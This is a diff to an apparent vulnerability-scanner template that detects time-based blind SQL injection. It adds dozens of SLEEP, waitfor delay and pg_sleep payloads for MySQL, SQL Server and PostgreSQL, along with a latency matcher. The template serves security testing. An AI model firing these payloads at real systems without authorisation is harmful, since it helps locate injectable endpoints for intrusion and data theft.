@@ -2,11 +2,11 @@ id: time-based-sqli
 
 info:
   name: Time-Based Blind SQL Injection
-  author: 0xKayala
+  author: 0xKayala,Jaenact
   severity: critical
   description: |
-    This Template detects time-based Blind SQL Injection vulnerability
-  tags: time-based-sqli,sqli,dast,blind
+    Sends time-delay SQL payloads and measures response latency to confirm blind injection in various database engines, enabling data extraction without direct error messages.
+  tags: time-based-sqli,sqli,dast,blind,vuln
 
 flow: http(1) && http(2)
 
@@ -29,12 +29,87 @@ http:
 
     payloads:
       injection:
+        # MySQL / MariaDB
         - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
         - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
         - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
         - "if(now()=sysdate(),SLEEP(7),0)"
         - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
         - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+        - "sleep(7)#"
+        - "1 or sleep(7)#"
+        - "\" or sleep(7)#"
+        - "' or sleep(7)#"
+        - "\" or sleep(7)=\""
+        - "' or sleep(7)='"
+        - "1) or sleep(7)#"
+        - "\") or sleep(7)=\""
+        - "') or sleep(7)='"
+        - "1)) or sleep(7)#"
+        - "\")) or sleep(7)=\""
+        - "')) or sleep(7)='"
+        - "AND (SELECT * FROM (SELECT(SLEEP(7)))bAKL) AND 'vRxe'='vRxe"
+        - "AND (SELECT * FROM (SELECT(SLEEP(7)))YjoC) AND '%'='"
+        - "AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)"
+        - "AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)--"
+        - "AND (SELECT * FROM (SELECT(SLEEP(7)))nQIP)#"
+        - "SLEEP(7)#"
+        - "SLEEP(7)--"
+        - "SLEEP(7)=\""
+        - "SLEEP(7)='"
+        - "or SLEEP(7)"
+        - "or SLEEP(7)#"
+        - "or SLEEP(7)--"
+        - "or SLEEP(7)=\""
+        - "or SLEEP(7)='"
+        - "AnD SLEEP(7)"
+        - "AnD SLEEP(7)--"
+        - "AnD SLEEP(7)#"
+        - "&&SLEEP(7)"
+        - "&&SLEEP(7)--"
+        - "&&SLEEP(7)#"
+        - "' AnD SLEEP(7) ANd '1"
+        - "'&&SLEEP(7)&&'1"
+        - "ORDER BY SLEEP(7)"
+        - "ORDER BY SLEEP(7)--"
+        - "ORDER BY SLEEP(7)#"
+        - "(SELECT * FROM (SELECT(SLEEP(7)))ecMj)"
+        - "(SELECT * FROM (SELECT(SLEEP(7)))ecMj)#"
+        - "(SELECT * FROM (SELECT(SLEEP(7)))ecMj)--"
+        - "+ SLEEP(7) + '"
+        - "SLEEP(7)/*' or SLEEP(7) or '\" or SLEEP(7) or \"*/"
+
+        # SQL Server
+        - ";waitfor delay '0:0:7'--"
+        - ");waitfor delay '0:0:7'--"
+        - "';waitfor delay '0:0:7'--"
+        - "\";waitfor delay '0:0:7'--"
+        - "');waitfor delay '0:0:7'--"
+        - "\");waitfor delay '0:0:7'--"
+        - "));waitfor delay '0:0:7'--"
+        - "'));waitfor delay '0:0:7'--"
+        - "\"));waitfor delay '0:0:7'--"
+        - "waitfor delay '00:00:07'"
+        - "waitfor delay '00:00:07'--"
+        - "waitfor delay '00:00:07'#"
+
+        # PostgreSQL
+        - "pg_sleep(7)--"
+        - "1 or pg_sleep(7)--"
+        - "\" or pg_sleep(7)--"
+        - "' or pg_sleep(7)--"
+        - "1) or pg_sleep(7)--"
+        - "\") or pg_sleep(7)--"
+        - "') or pg_sleep(7)--"
+        - "1)) or pg_sleep(7)--"
+        - "\")) or pg_sleep(7)--"
+        - "')) or pg_sleep(7)--"
+        - "pg_SLEEP(7)"
+        - "pg_SLEEP(7)--"
+        - "pg_SLEEP(7)#"
+        - "or pg_SLEEP(7)"
+        - "or pg_SLEEP(7)--"
+        - "or pg_SLEEP(7)#"
 
     fuzzing:
       - part: query
@@ -44,8 +119,9 @@ http:
           - "{{injection}}"
 
     stop-at-first-match: true
+
     matchers:
       - type: dsl
         dsl:
           - "duration>=7 && duration <=16"
-# digest: 4a0a004730450220221817cdddedb8336ddb4afc4476f70da46a0dfb726a703a5e748458ae5bef000221009ebe3675d3fd10bf29161c179bd9b317b01f18643c2f8a6731ed9d89569495cc:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100f81a7af56429232ba4c582bc7ec7a8f6259d3220126dce0bf15189a7cc0a4a30022100b39ba449c1f3d3230700db35466858af68993bd8c9630b50225a77e5e2ca8b6e:922c64590222798bb761d5b6d8e72950
